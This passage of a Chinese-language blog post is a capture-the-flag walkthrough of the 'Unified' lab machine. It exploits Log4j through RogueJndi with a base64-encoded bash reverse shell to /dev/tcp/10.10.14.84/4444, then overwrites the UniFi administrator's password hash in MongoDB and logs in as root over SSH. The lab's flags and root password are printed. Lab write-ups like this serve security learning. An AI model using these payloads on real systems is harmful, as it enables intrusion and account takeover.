+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi/target]<br>└─<span class="hljs-comment"># java -jar RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;10.10.14.84&quot;       </span><br>+-+-+-+-+-+-+-+-+-+<br>|R|o|g|u|e|J|n|d|i|<br>+-+-+-+-+-+-+-+-+-+<br>Starting HTTP server on 0.0.0.0:8000<br>Starting LDAP server on 0.0.0.0:1389<br>Mapping ldap://10.10.14.84:1389/o=websphere1 to artsploit.controllers.WebSphere1<br>Mapping ldap://10.10.14.84:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1<br>Mapping ldap://10.10.14.84:1389/ to artsploit.controllers.RemoteReference<br>Mapping ldap://10.10.14.84:1389/o=reference to artsploit.controllers.RemoteReference<br>Mapping ldap://10.10.14.84:1389/o=tomcat to artsploit.controllers.Tomcat<br>Mapping ldap://10.10.14.84:1389/o=websphere2 to artsploit.controllers.WebSphere2<br>Mapping ldap://10.10.14.84:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2<br>Mapping ldap://10.10.14.84:1389/o=groovy to artsploit.controllers.Groovy<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nc -lvp 4444             </span><br>listening on [any] 4444 ...<br>10.129.202.83: inverse host lookup failed: Unknown host<br>connect to [10.10.14.84] from (UNKNOWN) [10.129.202.83] 48416<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (7): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>unifi@unified:/usr/lib/unifi$<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi$ <span class="hljs-built_in">ls</span> -al<br><span class="hljs-built_in">ls</span> -al<br>total 40<br>drwxr-xr-x 1 unifi unifi  4096 Jul 31 12:36 .<br>drwxr-xr-x 1 root  root   4096 Jan  2  2022 ..<br>drwxr-xr-x 2 unifi unifi  4096 Jan  2  2022 bin<br>lrwxrwxrwx 1 root  root     11 Sep 20  2021 data -&gt; /unifi/data<br>drwxr-xr-x 3 unifi unifi  4096 Jan  2  2022 dl<br>drwxr-xr-x 3 unifi unifi 12288 Jan  2  2022 lib<br>lrwxrwxrwx 1 root  root     10 Sep 20  2021 logs -&gt; /unifi/log<br>lrwxrwxrwx 1 root  root     14 Sep 20  2021 run -&gt; /var/run/unifi<br>drwxr-xr-x 3 unifi unifi  4096 Jan  2  2022 webapps<br>drwxr-xr-x 3 unifi unifi  4096 Jul 31 12:36 work<br>unifi@unified:/usr/lib/unifi$<br></code></pre></td></tr></table></figure>
+
+<p>发现user flag：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/home/michael$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>6ced1a6a89e666c0620cdb10262ba127<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权部分："><a href="#提权部分：" class="headerlink" title="提权部分："></a>提权部分：</h2><p>查看进程，发现<code>bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1</code></p>
+<blockquote>
+<p>MongoDB是一个源代码可用的跨平台面向文档的数据库程序。<br>MongoDB被归类为NoSQL数据库程序，它使用具有可选模式的类似JSON的文档。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi$ ps aux<br>ps aux<br>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>unifi          1  0.0  0.0   1080     4 ?        Ss   12:36   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi<br>unifi          7  0.0  0.1  18512  3044 ?        S    12:36   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi<br>unifi         17  0.8 27.3 3676460 555952 ?      Sl   12:36   0:53 java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=<span class="hljs-literal">true</span> -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start<br>unifi         67  0.2  4.1 1101696 85156 ?       Sl   12:36   0:17 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1<br>unifi       1969  0.0  0.1  18380  3088 ?        S    13:45   0:00 bash -c &#123;<span class="hljs-built_in">echo</span>,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;<br>unifi       1973  0.0  0.1  18512  3288 ?        S    13:45   0:00 bash -i<br>unifi       1976  0.0  0.1  18380  2992 ?        S    13:45   0:00 /bin/bash -c /bin/bash -i &gt;&amp;/dev/tcp/10.10.14.84/4444 0&gt;&amp;1<br>unifi       1977  0.0  0.1  18512  3448 ?        S    13:45   0:00 /bin/bash -i<br>unifi       2874  0.0  0.1  18380  3104 ?        S    14:18   0:00 bash -c &#123;<span class="hljs-built_in">echo</span>,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;<br>unifi       2878  0.0  0.1  18512  3356 ?        S    14:18   0:00 bash -i<br>unifi       2881  0.0  0.1  18380  2984 ?        S    14:18   0:00 /bin/bash -c /bin/bash -i &gt;&amp;/dev/tcp/10.10.14.84/4444 0&gt;&amp;1<br>unifi       2882  0.0  0.1  18512  3216 ?        S    14:18   0:00 /bin/bash -i<br>unifi       2899  0.0  0.1  34408  2824 ?        R    14:19   0:00 ps aux<br></code></pre></td></tr></table></figure>
+
+<p>让我们通过使用mongo命令行实用程序并尝试提取管理员密码来与MongoDB服务进行交互。使用关键字UniFi Default Database在谷歌上快速搜索显示，UniFi应用程序的默认数据库名称为ace。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;db.admin.find().forEach(printjson);&quot;</span><br>&lt;17 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;db.admin.find().forEach(printjson);&quot;</span><br>MongoDB shell version v3.6.3<br>connecting to: mongodb://127.0.0.1:27117/ace<br>MongoDB server version: 3.6.3<br>&#123;<br>        <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>),<br>        <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;administrator&quot;</span>,<br>        <span class="hljs-string">&quot;email&quot;</span> : <span class="hljs-string">&quot;administrator@unified.htb&quot;</span>,<br>        <span class="hljs-string">&quot;x_shadow&quot;</span> : <span class="hljs-string">&quot;$6$Ry6Vdbse<span class="hljs-variable">$8enMR5Znxoo</span>.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;</span>,<br>        <span class="hljs-string">&quot;time_created&quot;</span> : NumberLong(1640900495),<br>        <span class="hljs-string">&quot;last_site_name&quot;</span> : <span class="hljs-string">&quot;default&quot;</span>,<br></code></pre></td></tr></table></figure>
+
+<p>输出显示一个名为Administrator的用户。他们的密码散列位于x_shadow变量中，但在这种情况下，任何密码破解实用程序都无法破解它。相反，我们可以用自己创建的哈希更改x_shadow密码哈希，以便替换管理员密码并向管理面板进行身份验证。为此，我们可以使用mkpasswd命令行实用程序。</p>
+<p>先使用<code>mkpasswd -m sha-512 password</code>命令，得到password的sha512加密后的值：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># mkpasswd -m sha-512 password</span><br>$6$eLXCcCov55K4HCAT<span class="hljs-variable">$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V</span>.<br></code></pre></td></tr></table></figure>
+
+<p>将administrator的密码修改为password：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&#x27;db.admin.update(&#123;&quot;_id&quot;:ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set：&#123;&quot;x_shadow&quot;:&quot;$6$hwb9W.VC28pwXtPT$N8DRe.81H.wB3NN5Ac/5zhGdQkKAibE/i/7I6kvKaVbWGYApa9EghEhtyqtz39qS6x6oDNRNo5z9Nk9m2VMio0&quot;&#125;&#125;)&#x27;</span><br>&lt;aVbWGYApa9EghEhtyqtz39qS6x6oDNRNo5z9Nk9m2VMio0<span class="hljs-string">&quot;&#125;&#125;)&#x27;</span><br><span class="hljs-string">MongoDB shell version v3.6.3</span><br><span class="hljs-string">connecting to: mongodb://127.0.0.1:27117/ace</span><br><span class="hljs-string">MongoDB server version: 3.6.3</span><br><span class="hljs-string">2023-07-31T15:15:08.132+0100 E QUERY    [thread1] SyntaxError: illegal character @(shell eval):1:66</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>SHA-512或安全哈希算法512是一种哈希算法，用于将任何长度的文本转换为固定大小的字符串。每个输出产生一个长度为512位（64字节）的SHA-512。该算法通常用于电子邮件地址哈希、密码哈希…</p>
+</blockquote>
+<p>在哈希过程中添加salt，以强制其唯一性，在不增加用户需求的情况下增加其复杂性，并减轻哈希表等密码攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&#x27;db.admin.update(&#123;&quot;_id&quot;:ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set:&#123;&quot;x_shadow&quot;:&quot;$6$eLXCcCov55K4HCAT$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.&quot;&#125;&#125;)&#x27;</span>                                       <br>&lt;q2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.<span class="hljs-string">&quot;&#125;&#125;)&#x27;                                                                                                                                                                                                                                               </span><br><span class="hljs-string">MongoDB shell version v3.6.3                                                                                                                                                                                                                                                                       </span><br><span class="hljs-string">connecting to: mongodb://127.0.0.1:27117/ace                                                                                                                                                                                                                                                       </span><br><span class="hljs-string">MongoDB server version: 3.6.3                                                                                                                                                                                                                                                                      </span><br><span class="hljs-string">WriteResult(&#123; &quot;</span>nMatched<span class="hljs-string">&quot; : 1, &quot;</span>nUpserted<span class="hljs-string">&quot; : 0, &quot;</span>nModified<span class="hljs-string">&quot; : 1 &#125;)                                                                                                                                                                                                                                  </span><br><span class="hljs-string">unifi@unified:/usr/lib/unifi$</span><br></code></pre></td></tr></table></figure>
+
+<p>查看结果有没有修改成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;db.admin.find().forEach(printjson);&quot;</span>                                                                                                                                                                                                  <br>&lt;17 ace --<span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;db.admin.find().forEach(printjson);&quot;</span>                                                                                                                                                                                                                                               <br>MongoDB shell version v3.6.3                                                                                                                                                                                                                                                                       <br>connecting to: mongodb://127.0.0.1:27117/ace                                                                                                                                                                                                                                                       <br>MongoDB server version: 3.6.3                                                                                                                                                                                                                                                                      <br>&#123;                                                                                                                                                                                                                                                                                                  <br>        <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;61ce278f46e0fb0012d47ee4&quot;</span>),                                                                                                                                                                                                                                              <br>        <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;administrator&quot;</span>,                                                                                                                                                                                                                                                                  <br>        <span class="hljs-string">&quot;email&quot;</span> : <span class="hljs-string">&quot;administrator@unified.htb&quot;</span>,                                                                                                                                                                                                                                                     <br>        <span class="hljs-string">&quot;x_shadow&quot;</span> : <span class="hljs-string">&quot;$6$eLXCcCov55K4HCAT<span class="hljs-variable">$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V</span>.&quot;</span>,                                                                                                                                                                 <br>        <span class="hljs-string">&quot;time_created&quot;</span> : NumberLong(1640900495),                                                                                                                                                                                                                                                   <br>        <span class="hljs-string">&quot;last_site_name&quot;</span> : <span class="hljs-string">&quot;default&quot;</span>,<br></code></pre></td></tr></table></figure>
+
+<p>使用管理员用户和密码成功登录，在setting里可以发现root的密码：NotACrackablePassword4U2022，使用ssh连接root用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># ssh root@10.129.202.83</span><br>root@10.129.202.83<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br></code></pre></td></tr></table></figure>
+
+<p>最后的root flag在这里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@unified:~<span class="hljs-comment"># ls</span><br>root.txt<br>root@unified:~<span class="hljs-comment"># cat root.txt </span><br>e50bc93c75b634e4b272d2f771c33681<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/Unified2.png" alt="Untitled"></p>
+<h1 id="Listening"><a href="#Listening" class="headerlink" title="Listening"></a>Listening</h1><ol>
+<li>You may be wondering what it is, and why people are so concerned about it. Some even call it the worst vulnerability since Wannna Cry.</li>
+<li>Log4j is a popular logging library for Java created in 2001. It is part of the Apache Software Foundation, however, this doesn’t mean the maintainers are paid. All of their work is volunteer-based.</li>
+<li>The logging library’s main purpose is to provide developers with a way to change the format and verbosity of logging through configuration files versus code.</li>
+</ol>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/08/02/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC48%E5%A4%A9/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>web攻防笔记第48天</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/07/28/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC47%E5%A4%A9/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      web攻防笔记第47天
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">人</div><div class="matts">人</div><div class="matts">为</div><div class="matts">我</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">我</div><div class="matts">为</div><div class="matts">人</div><div class="matts">人</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">Theme Tranquility</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:flow63681@gmail.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/ABCkillmen">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-wx.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.freebuf.com/author/FlowsecNagi">Freebuf</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-zh.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.zhihu.com/">知乎</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:flow63681@gmail.com">flow63681@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">FlowsecNagi's Home</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+  
+
+  </body>
+</html>
